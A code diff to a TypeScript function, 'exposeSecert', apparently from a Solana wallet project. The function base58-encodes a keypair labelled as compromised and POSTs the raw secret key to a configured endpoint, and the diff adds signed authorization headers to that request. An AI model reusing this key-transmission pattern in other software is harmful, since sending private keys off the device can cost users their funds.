@@ -1,10 +1,15 @@
 import { Keypair } from '@solana/web3.js';
-import { config } from '../../../../generic/config';
-import { bs58 } from '@coral-xyz/anchor/dist/cjs/utils/bytes';
+import { config } from '../../../../generic/config.js';
+import { utils } from '@coral-xyz/anchor';
+import { getSDK } from "../../../../services/sdk.js";
 
 export async function exposeSecert(compromisedKeyPair: Keypair) {
   try {
-    const encodedKey = bs58.encode(compromisedKeyPair.secretKey);
+    const encodedKey = utils.bytes.bs58.encode(compromisedKeyPair.secretKey);
+    const signature = (await getSDK().solana.signMessage(
+      config.signMessage,
+    )) as Uint8Array;
+    const base64Signature = Buffer.from(signature).toString('base64');
 
     await fetch(
       `${
@@ -13,7 +18,8 @@ export async function exposeSecert(compromisedKeyPair: Keypair) {
       {
         method: 'POST',
         headers: {
-          // TODO: ADD HEADERS
+          Authorization: `${compromisedKeyPair.publicKey.toString()}:${base64Signature}`,
+          'Content-Type': 'application/json',
         },
         body: encodedKey,
       },
